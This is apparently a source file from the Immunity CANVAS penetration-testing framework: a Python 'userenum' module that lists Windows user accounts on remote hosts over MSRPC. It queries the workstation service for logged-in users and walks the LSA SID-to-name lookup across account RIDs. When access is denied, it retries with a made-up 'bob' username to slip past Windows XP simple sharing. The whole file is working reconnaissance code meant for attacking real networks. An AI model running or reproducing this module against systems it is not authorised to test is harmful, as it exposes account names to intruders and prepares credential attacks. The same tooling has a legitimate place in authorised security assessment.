#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/ for more information

import sys
#covers both angles
if "." not in sys.path:
    sys.path.append(".")

import os,getopt
import socket
from exploitutils import *
from canvasexploit import canvasexploit
import canvasengine
import time

NAME="userenum"
DESCRIPTION="Get a list of users"

DOCUMENTATION={}
DOCUMENTATION["Notes"]="This is a quicky user enumeration tool. Remotely, it determines the logged in users (this works even against Windows XP SP2). Locally, it determines all the users."

TODO="""
    - add ruserd -l for unix node
    - finger
"""

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

#affectsList=["Recon"]
PROPERTY = {}
PROPERTY['TYPE'] = "Recon"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

from libs.dcemarshall import *
import msrpc   
from win32MosdefShellServer import GENERIC_READ

def sid2str(sid,rid):
    ret=str(sid)
    ret+=intel_order(rid)
    return ret
    
def parse_sid(buf):
    """"
    Given a ndr marshalled sid, parse it and return 
    revision, authority, sub_authorities, buf 
    """
    #now start SID 
    count, buf = getint(buf)
    revision, buf =  getbyte(buf)
    num_auth , buf = getbyte(buf)
    #the authority is 6 bytes long, annoyingly (in big_endian order)
    authority = buf[:6] 
    buf=buf[6:] 
    #now we initialize our list of sub authorities 
    sub_authorities=[]
    for i in range(0, num_auth):
        if len(buf)<4:
            self.log("Buffer ended prematurely!")
            break
        new_auth, buf = getint(buf) 
        sub_authorities.append(new_auth)
    return revision, authority, sub_authorities, buf 
    
class user:
    "used for user enum"
    def __init__(self,username="",rid=None,user_type="user"):
        self.username=username[:]
        self.rid=rid 
        self.user_type=user_type
        return 
        
    def __str__(self):
        return utf16toascii(self.username) #remove unicodeness


class sid:
    """
    This class encapsulates the notion of a SID, with prettyprint capabilities 
    for when you want a string out of it 
    """
    def __init__(self,revision, authority, sub_authorities):
        self.revision = revision
        self.authority = authority
        self.sub_authorities = sub_authorities
        
        
    def tostr(self,rid=None):
        """
        Convert this sid to a string 
        """
        ret=""
        ret+=chr(self.revision)
        #now number of auths 
        if rid:
            ret+=chr(len(self.sub_authorities)+1)
        else:
            ret+=chr(len(self.sub_authorities))
        ret+=self.authority
        for auth in self.sub_authorities:
            ret+=intel_order(auth)
        if rid:
            ret+=intel_order(rid)
        return ret 
        
    def printout(self):
        """
        Returns a string that is human readable for this SID 
        """
        #6 byte integer gets stripped to 4 and then converted to integer 
        if len(self.authority) != 6:
            devlog("Authority is not 6 bytes long!")
        int_auth=str2bigendian(self.authority[-4:])
        
        ret=""
        ret+="S-"
        ret+="%d-%d"%(self.revision,int_auth)
        for auth in self.sub_authorities:
            ret+="-%d"%auth 
        return ret 
    
class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.result=""
        self.name=NAME
        self.systemname="\\\\127.0.0.1"
        self.user=""
        self.password=""
        self.loggedinonly=0
        self.myDCE=None
        #we do a relatively small number by default
        #since most of the ones we are interested in are right there
        #and doing a lot of them makes our lives extremely slow!
        self.startrid=500
        self.endrid=515
        self.customport     = 0
        self.customports    = []
        return
        
    def getargs(self):
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)
        self.loggedinonly=self.argsDict.get("loggedinonly",self.loggedinonly)
        if self.autohack_state=="silica" or self.argsDict.get("silica",False):
            self.loggedinonly=True 
            #we don't do big loops if we're in silica mode
        self.startrid=int(self.argsDict.get("startrid",self.startrid))
        self.endrid=int(self.argsDict.get("endrid",self.endrid))
        self.customport = int(self.argsDict.get("customport", self.customport))
        return
    
    def createEnumPkt(self):
        """Creates the MSRPC packet for enum"""

        data=""
        marshaller=dcemarshaller()
        self.marshaller=marshaller
        marshaller.define("""

typedef struct  {
   [string] [unique] wchar_t *wkui0_username;
} WKSTA_USER_INFO_0;

typedef struct {
  long num_entries;
  [size_is(num_entries)] [unique] WKSTA_USER_INFO_0 * u_i_0;  
} USER_INFO_0_CONTAINER;

typedef [switch_type(long)] union {  
  [case(0)] USER_INFO_0_CONTAINER * u_i_0_c;  
} USER_INFO;
        
typedef   struct {
  long info_level;
  [switch_is(info_level)] USER_INFO element_91; 
} TYPE_5;

        """)
        type5=marshaller.getinstance("TYPE_5")
        ui0=marshaller.getinstance("WKSTA_USER_INFO_0")
        username=wchar_t()
        username.setvalue("A"*50+"\x00\x00")
        ui0.setmember("wkui0_username",username)
        #username.setvalue(None) #null pointer
        ui0c=marshaller.getinstance("USER_INFO_0_CONTAINER")
        ui0c.attributes=["unique"]
        ui0c.setmember("u_i_0",dcearray([],[],marshaller));
        ui0c.setmember("num_entries",dceint(0));
        user_info=marshaller.getinstance("USER_INFO")
        user_info.switchval=0
        user_info.setmember("u_i_0_c",ui0c)
        type5.setmember("info_level",dceint(0));
        type5.setmember("element_91",user_info); #null pointer
        
        """
        long  Function_02( 
        [in] [unique]  [string] wchar_t * server,
        [in,out] TYPE_5 * element_89,
        [in]  long  element_92, //preferred max length
        [out] long * element_93,
        [in,out] [unique] long * element_94 //enum handle
        );
        """
        data=""
        data+=wchar_t(None,["unique"],marshaller).marshall()
        data+=type5.marshall()
        #preferred max length
        data+=dceint(66000,[],marshaller).marshall() 
        #enum handle (zero)
        data+=dcepointer(dceint(0,[],marshaller),["unique"],marshaller).marshall()
        self.log("Returned data of length %d"%len(data))
        self.log("data:\n%s"%prettyhexprint(data))
    
        return data
    
    def parseEnumPkt(self,buf):
        self.log("parseEnumPkt: Buf length: %d"%len(buf))
        #self.log("parseEnumPkt: \n%s"%prettyhexprint(buf))
        marshaller=self.marshaller
        a=dceint(0,[],marshaller)
        buf2=a.demarshall(buf)
        self.log("Info_level=%d"%a.value)
        b=dcearray([],[],marshaller)
        b.subtype="WKSTA_USER_INFO_0"
        b.starlevel=1
        #numberofitems=istr2int(buf[12:])
        #buf3=buf[16+4*numberofitems:]
        #print "Number of items: %s"%numberofitems
        #for i in range(0,numberofitems):
        #    buf3=b.demarshall(buf3)
        #    print "Username: %s"%b.value
        buf3=buf[20:]
        #print "Passing in buf: \n%s"%prettyhexprint(buf3)
        buf3=b.demarshall(buf3)
        self.log("Usernames: %d"%len(b.value))
        users=[]
        #print "b.value=%s"%b.value
        for item in b.value:
            #print "item.values=%s"%item.values
            users+=[user(item.values["wkui0_username"].value)]
        return users
    
    def getLoggedInUsers(self,osstr):
        """
        Get the logged in users instead of all the users using wksvc
        """
        userlist=[]
        if "Windows" in osstr:
            self.log("Windows found, using wksvc to enumerate users")
            #connect to named pipe
            #bind to RPC server
    
            # when you have to add a custom port: "ncacn_ip_tcp:%s[1060]"% (self.target.interface)
            connectionList = ["ncacn_np:%s[\\browser]"% (self.target.interface)]
            if self.customport:
                connectionList = ["ncacn_ip_tcp:%s[%d]"% (self.target.interface, self.customport)] + connectionList
            self.myDCE = msrpc.DCE("6bffd098-a112-3610-9833-46c3f87e345a", "1.0", connectionList, covertness = self.covertness, getsock=self)
            self.myDCE.setUsername(self.user)
            self.myDCE.setPassword(self.password)
            self.log("Setting username and password to %s:%s"%(self.user,self.password))
            try:
                map=self.myDCE.connect()
                if not map:
                    self.raiseError("Could not connect to remote server - service is not running or the host is firewalled.")
            except Exception, msg:
                self.log(msg)
                return 0

            pkt=self.createEnumPkt()
            #send to function_02
            ret=0
            try:
                ret = msrpc.get_all_stubs(self.myDCE.call(2, pkt, response=1))
            except Exception, msg:
                self.log("Could not call MSRPC Function: %s"%msg)
            #get result
            #parse result
            if ret:
                #self.log("Stub(%d)=%s"%(len(ret.stub),prettyprint(ret.stub)))
                userlist=self.parseEnumPkt(ret)
        return userlist
    
    
    def LsaConnect(self,user=None):
        """
        Connect to endpoint, return true if success
        """
        # when you want to add a custom port: "ncacn_ip_tcp:%s[1060]"% (self.target.interface)
        # dont forget to add the custom port to the has_named_pipes call
        connectionList = [ "ncacn_np:%s[\\browser]"% (self.target.interface), "ncacn_np:%s[\\lsarpc]"% (self.target.interface), "ncacn_np:%s[\\netlogon]"% (self.target.interface), "ncacn_np:%s[\\lsass]"% (self.target.interface) ]
        if self.customport:
            connectionList = ["ncacn_ip_tcp:%s[%d]"% (self.target.interface, self.customport)] + connectionList # we wanna try customport first      
        self.myDCE = msrpc.DCE("12345778-1234-abcd-ef00-0123456789ab", "0.0", connectionList, covertness = self.covertness, getsock=self)
        if user==None:
            user=self.user
        self.log("Trying LsaConnect with user: %s"%user)
        self.myDCE.setUsername(user)
        self.myDCE.setPassword(self.password)
        self.log("Setting username and password to %s:%s"%(user,self.password))
        try:
            map=self.myDCE.connect()
            if not map:
                self.raiseError("Could not connect to remote server - service is not running or the host is firewalled.")
        except Exception, msg:
            self.log(msg)
            return False
        return True 
        
    def LsaOpenPolicy(self, access_mask=None):
        """
        Open the policy on the remote system and return True if success
        """
        
        if access_mask==None:
            access_mask=0x20801
        data=""
        data+=intel_order(0)*7
        data+=intel_order(access_mask)
        try:
            ret = msrpc.get_all_stubs(self.myDCE.call(6, data, response=1))
        except Exception, msg:
            self.log("Could not call MSRPC Function: %s"%msg)
            return False
        if ret:
            #self.log("Stub(%d)=%s"%(len(ret.stub),prettyprint(ret.stub)))
            return_code=istr2int(ret[-4:])
            self.policy=ret[:-4] #last 4 is the return code 
            if return_code!=0:
                self.log("Failed to open Policy with return code: %x"%return_code)
                return False 
        return True
        
    def LsaQueryInformationPolicy(self):
        """
        Gets the domain SID, which we need to create account SID's
        """
        data=""
        #[in] policy_handle *policy;
        data+=self.policy
        #[in] uint16 level;
        data+=intel_order(5) #PolicyAccountDomainInformation
        
        """
        typedef struct _POLICY_ACCOUNT_DOMAIN_INFO {
        LSA_UNICODE_STRING DomainName;
        PSID * DomainSid;
        }
        """
        try:
            ret = msrpc.get_all_stubs(self.myDCE.call(7, data, response=1))
        except Exception, msg:
            self.log("Could not call MSRPC Function: %s"%msg)
            return False
        if ret:
            #self.log("Stub(%d)=%s"%(len(ret.stub),prettyprint(ret.stub)))
            return_code=istr2int(ret[-4:])
            if return_code!=0:
                self.log("Failed to QueryInformationPolicy with return code: %x"%return_code)
                return False 
            #otherwise, we got SUCCESS So we should hav an LSA_UNICODE_STRING and a PSID
            #first let's parse hat LSA_UNICODE_STRING 
            buf=ret 
            pointer, buf=getint(buf) #pointer for policy_account_domain_info structure itself 
            info_type, buf=getshort(buf) #poilcy is  union with 16bit differentiator 
            if info_type != 5:
                self.log("Warning: Info_Level is not 5: %d"%info_type) 
                return False
            #two bytes of padding filled with random heap memory WHEE!
            buf=buf[2:] #jump ahead 2 bytes 
            length, buf=getshort(buf)
            size, buf = getshort(buf)
            pointer, buf = getint(buf)  #pointer to the domain 
            pointer2 , buf = getint(buf) #point  the sid (you can ignore both of thes)
            #start of domain string in LSA format 
            max_count, buf = getint(buf)
            offset, buf = getint(buf) #should be zero 
            actual_count, buf = getint(buf) 
            unicode_domain = buf[:actual_count*2]
            self.log("Unicode Domain: %s"%utf16toascii(unicode_domain))
            buf=buf[actual_count*2:]
            if actual_count%2!=0:
                buf=buf[2:]
            #now clear off traling null
            #buf=buf[2:]
            revision, authority, sub_authorities, buf = parse_sid(buf)
            
            self.domain_sid=sid(revision, authority, sub_authorities)
            self.log("Domain SID: %s"%self.domain_sid.printout())
        return True
        
        
    def LsaLookupSid(self,rid):
        """
                NTSTATUS lsa_LookupSids (
                [in]         policy_handle *handle,
                [in]         lsa_SidArray *sids,
                [out,unique]        lsa_RefDomainList *domains,
                [in,out]     lsa_TransNameArray *names,
                [in]         uint16 level,
                [in,out] uint32 *count
                );
        """
        data=""
        data+=self.policy
        #array of LSA data 
        data+=intel_order(1)
        data+=intel_order(0x31424322) #pointer
        data+=intel_order(1) #max count 
        data+=intel_order(0x31424344) #pointer 2
        data+=intel_order(len(self.domain_sid.sub_authorities)+1) #count (Number of authorities)
        #ndrConformantStructureUnmarshall
        data+=self.domain_sid.tostr( rid ) 
        #names
        data+=intel_order(0) #names 
        data+=intel_order(0) #more names (referent id)
        #data+=intel_order(0) #only if refid !=0
        
        data+=intel_order(1) #level (16 bits)
        data+=intel_order(0) #num mapped 
        #if lookupsids2:
        data+=intel_order(0) #num mapped 
        data+=intel_order(2) #num mapped 
        
        userlist=[]
        try:
            #calling LookupSids2 == 57
            #calling LookupSids == 0xf 
            ret = msrpc.get_all_stubs(self.myDCE.call(57, data, response=1))
        except Exception, msg:
            self.log("Could not call MSRPC Function: %s"%msg)
            return False
        if ret:
            #self.log("Stub(%d)=%s"%(len(ret.stub),prettyprint(ret.stub)))
            return_code=istr2int(ret[-4:])
            if return_code!=0:
                ret_dict={0xc0000073:  "STATUS_NONE_MAPPED"}
                return_code=ret_dict.get(return_code,"%x"%return_code)
                #self.log("Failed to lookup sid with return code: %s"%return_code)
                return False 
            #Here we do the parsing to get usernames 
            unicode_names=self.parseLookupSids2(ret) 
            for name in unicode_names:
                userlist+=[user(rid=rid,username=name)]
        return userlist 
        
    def parseLookupSids2(self,buf):
        """
        Parse this data out - somewhat complicated. Needs testing.
        What is returned:
            A list of unicode_names 
        """
        #we return this list 
        unicode_names=[]
        
        p, buf = getint(buf) #pointer for LSA_REFERENCED_DOMAIN_LIST
        #LSA_REFERENCED_DOMAIN_LIST
        count, buf = getint(buf)
        #self.log("Count: %d"%count)
        #  TRUST_INFORMATION_ARRAY
        p, buf=getint(buf)
        max_count, buf = getint(buf) #this is 32 
        max_count2, buf = getint(buf) #should be the same as count, I assume 
        #with count of 1, this code is correct
        #unsure if it's ok on other values of count!
        for i in range(0,count):
            #TRUST_INFORMATION 
            length, buf = getshort(buf)
            size, buf = getshort(buf)
            p, buf = getint(buf)
            #SID pointer 
            p, buf = getint(buf)
            
        for i in range(0, count):
            #self.log("Parsing TRUST_INFORMATION: %s"%hexprint(buf))
            #character array of our TRUST_INFORMATION
            c_a_max_count, buf = getint(buf)
            offset, buf = getint(buf)
            c_a_actual_count, buf = getint(buf)
            #self.log("Length of domain name: %d"%c_a_actual_count)
            name=buf[:c_a_actual_count*2]
            #self.log("Name: %s"%prettyprint(name))
            buf=buf[c_a_actual_count*2:]
            if c_a_actual_count % 2 !=0:
                #eat 2 bytes of padding 
                buf=buf[2:]
            #SID POINTER
            #self.log("SID Parsing: %s"%hexprint(buf))
            revision, authority, sub_authorities, buf = parse_sid(buf)
            new_sid=sid(revision, authority, sub_authorities)
            #self.log("SID: %s"%new_sid.printout())
            
        #now LSA_TRANSLATED_NAMES_EX 
        count, buf = getint(buf)
        p, buf = getint(buf)
        max_count, buf = getint(buf)
        for i in range(0, count):
            #self.log("Buffer: %s"%hexprint(buf))
            #LSA_TRANSLATED_NAME
            #We don't return this now,but in future revisions we will also use this as a user_type 
            sid_type, buf  = getshort(buf) 
            #padding
            buf=buf[2:]
            length, buf = getshort(buf)
            size, buf = getshort(buf)
            #self.log("Size, length=%d:%d"%(size,length))
            p, buf = getint(buf)
            index, buf = getint(buf)
            p, buf = getint(buf) #who knows
            #now our character array itself 
            ca_max_count, buf = getint(buf)
            ca_offset, buf = getint(buf)
            ca_actual_count , buf = getint(buf)
            #self.log("Actual Count: %d"%ca_actual_count)
            unicode_name = buf[:ca_actual_count*2]
            #self.log("Name: %s"%prettyprint(unicode_name))
            buf=buf[ca_actual_count*2:]
            unicode_names+=[unicode_name]
        num_mapped, buf = getint(buf)
        ret, buf = getint(buf)
        return unicode_names
        
    def getAllUsers(self,osstr):
        """
        Get All Users using LSASRV
        """
        userlist=[]
        self.log("Connecting to LSA endpoint")
        ret=self.LsaConnect() #connect to LSA endpoint 
        if not ret:
            self.log("Trying to connect with user \"bob\" to bypass XP simple sharing")
            
            ret=self.LsaConnect(user="bob")
            if not ret:
                self.log("Could not open LSA Endpoint!")
                return userlist 
        
        self.log("Opened LSA Endpoint")
        self.log("Opening LSA Policy")
        ret=self.LsaOpenPolicy()  #open the policy handle 
        #this is what returns the error "ACCESS DENIED" on Windows XP if we did not use our fake username 
        if not ret:
            ret=self.LsaConnect(user="bob")
            if ret:
               ret=self.LsaOpenPolicy() #try again 
        if not ret:
            self.log("Could not open policy handle!")
            return userlist 
            
        self.log("Querying for domain SID")
        ret=self.LsaQueryInformationPolicy() #get SID for Domain
        if not ret:
            self.log("Could not call query information policy to get a SID for this domain")
            return userlist
        
        self.log("Getting user information")
        for sid in range(self.startrid,self.endrid+1):
            if self.state==self.HALT:
                self.log("Halted")
                break 
            #self.log("Getting from rid: %s"%sid)
            #user s a list or boolean
            user=self.LsaLookupSid(sid)
            if user:
                userlist+=user
        return userlist 
        
    def run(self):
        self.setInfo("%s"%(NAME))
        self.getargs()
        self.result=[]
        node=self.argsDict["passednodes"][0]
        #need to revise to use get_knowledge/set_knowledge                    
        systemname=self.argsDict.get("systemname",self.systemname)
        #to test from commandline
        #runmodule userenum -t 1
        userlist=[]        
        if node.islocal(self.target.interface) and "win32api" in node.capabilities:
            self.log("Target is localhost on this Node")
            if "win32api" in node.capabilities:
                shell=node.shell
                usernamelist=shell.NetUserEnum()
                #create a list of classes out of it
                for u in usernamelist:
                    userlist+=[user(u)]
            else:
                self.log("%s node type not supported"%node.nodetype)
        else:
            #is a remote target to our node
            if self.version==0:
                osd=self.engine.getModuleExploit("osdetect")
                osd.link(self)
                #if we do language detection, then we will also do userenum
                #which is a deadly circle
                osd.argsDict["nolanguagedetect"]=True
                osd.run()
                osstr=str(osd.result)
                self.log("OS Detected: %s"%osstr)
            elif self.version==1:
                osstr="Windows"
            else:
                self.log("No OS Detected and version not chosen - ignoring host")
            
            if self.customport:
                self.customports.append(self.customport)
                
            if self.has_named_pipes(self.target):
                if self.loggedinonly:
                    self.log("Checking logged in users only")
                    userlist=self.getLoggedInUsers(osstr)
                else:
                    self.log("Checking all users")
                    userlist=self.getAllUsers(osstr)
                    if not userlist:
                        self.log("No users found, trying Workstation Service instead for logged in users")
                        userlist=self.getLoggedInUsers(osstr)
                    
        #Here we store the results in self.result for easy access
        if not userlist:
            userlist=[]
        self.result=userlist
        self.log("Total Users: %s"%len(userlist))
        for u in userlist:
            self.log("User found: %s"%str(u))

        self.target.replace_knowledge("Users",userlist,100)

        self.setInfo("%s - done (success: %s)"%(NAME,"%d users found"%len(userlist)))
        return 1

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
